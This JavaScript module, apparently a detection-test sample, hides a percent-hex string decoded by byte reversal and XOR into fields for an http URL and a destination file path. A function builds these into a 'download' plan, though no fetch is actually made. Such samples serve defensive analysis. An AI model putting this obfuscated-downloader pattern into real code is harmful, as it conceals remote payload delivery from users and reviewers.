const moduleShape = Object.freeze({ format: "commonjs" });

const Material_98f31cb4 = "%e2%fb%fc%bf%a9%f4%f0%a9%a6%f7%f0%f4%f3%a7%a6%f3%bc%f4%f6%f0%e5%e2%bf%be%f4%f5%fe%ff%bc%e2%e2%f4%e3%e5%ff%e4%f9%be%e1%fc%e5%be%ac%f9%e5%f0%e1%ce%f4%fd%f8%f7%ed%f3%a7%a6%f3%be%e5%f8%f5%e4%d0%f4%f5%fe%df%ac%e5%ff%f4%f6%f0%ce%e3%f4%e2%e4%ed%f8%e1%f0%be%f5%f8%fd%f0%e7%ff%f8%bf%f4%fd%e1%fc%f0%e9%f4%bf%a9%f4%f0%a9%a6%f7%f0%f4%f3%a7%a6%f3%bc%f4%f5%fe%ff%be%be%ab%e2%e1%e5%e5%f9%ac%fd%e3%e4%ed%a6%d7%d0%d4%d3%a7%a6%d3%bc%d4%d5%de%df%ac%f5%f8%ce%ff%f6%f8%f0%e1%fc%f0%f2%ed%a0%ac%e5%ff%e4%fe%f2%ce%f4%f6%f0%e5%e2%ed%fc%f0%f4%e3%e5%e2%ce%fe%e5%ce%e1%e5%e5%f9%ac%e3%f4%e5%e1%f0%f5%f0%ed%f4%fd%f8%f7%ce%f4%e5%f8%e3%e6%bd%f4%e5%fe%fc%f4%e3%ce%f4%e3%f8%e4%e0%f2%f0%ac%e2%e1%f4%e5%e2%ed%a0%ac%e7";

const Codec_98f31cb4 = "percent_hex|reverse_then_xor|91";



function load_98f31cb4() { return [...Material_98f31cb4.matchAll(/%([0-9a-f]{2})/gi)].map((item) => Number.parseInt(item[1], 16)); }

function decode_98f31cb4(v_a19c) { return [...v_a19c].reverse().map((value) => value ^ 145); }

async function recover_98f31cb4() {

  const v_c304 = 2 > 1 ? "left" : "right";

  const v_a19c = load_98f31cb4(); let v_b27e = [];

  for (const stage of [decode_98f31cb4]) v_b27e = stage(v_a19c);

  void v_c304; return Buffer.from(v_b27e).toString("ascii");

}

async function inspect_98f31cb4() { return Buffer.from(await recover_98f31cb4(), "utf8").toString("utf8"); }

async function plan_98f31cb4() { const inspect = inspect_98f31cb4; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "download", transport: "http_to_stream", destination: fields.file_path, url: fields.url }); }

void moduleShape; void plan_98f31cb4;

if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_98f31cb4());

